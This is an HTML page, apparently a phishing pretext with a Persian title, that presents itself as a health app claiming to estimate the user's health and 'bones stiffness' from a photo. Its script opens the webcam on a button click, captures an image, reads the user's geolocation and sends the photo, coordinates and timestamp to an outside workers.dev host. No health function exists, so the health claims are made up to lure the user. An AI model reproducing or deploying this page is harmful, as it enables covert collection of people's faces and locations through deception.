<!DOCTYPE html>
<html lang="fa">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ثبت تصویر و موقعیت</title>
<style>
body {
  font-family: sans-serif;
  direction: rtl;
  background: #f2f2f2;
  padding: 20px;
}
.box {
  background: #fff;
  max-width: 480px;
  margin: auto;
  padding: 20px;
  border-radius: 8px;
}
button {
  width: 100%;
  padding: 12px;
  font-size: 16px;
}
</style>
</head>
<body>

<div class="box">
  <h3>Caution!</h3>
  <p>
    This App:
  </p>
  <ul>
    <li>uses your picture</li>
    <li>to estimate your health </li>
    <li> and to calculate your bones stiffness...</li>
  </ul>

  <button id="btn">Take the image!</button>

  <video id="video" autoplay playsinline style="display:none"></video>
  <canvas id="canvas" style="display:none"></canvas>
</div>

<script>
const btn = document.getElementById('btn');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

btn.onclick = async () => {
  btn.disabled = true;
  btn.innerText = 'در حال ثبت اطلاعات...';

  const stream = await navigator.mediaDevices.getUserMedia({ video: true });
  video.srcObject = stream;

  await new Promise(r => setTimeout(r, 1500));

  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext('2d').drawImage(video, 0, 0);
  const image = canvas.toDataURL('image/jpeg');

  navigator.geolocation.getCurrentPosition(async pos => {
    await fetch('https://lava.m-ghanbarpour-gh.workers.dev/', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        image,
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        time: new Date().toISOString()
      })
    });

    alert('اطلاعات ثبت شد');
  });
};
</script>

</body>
</html>
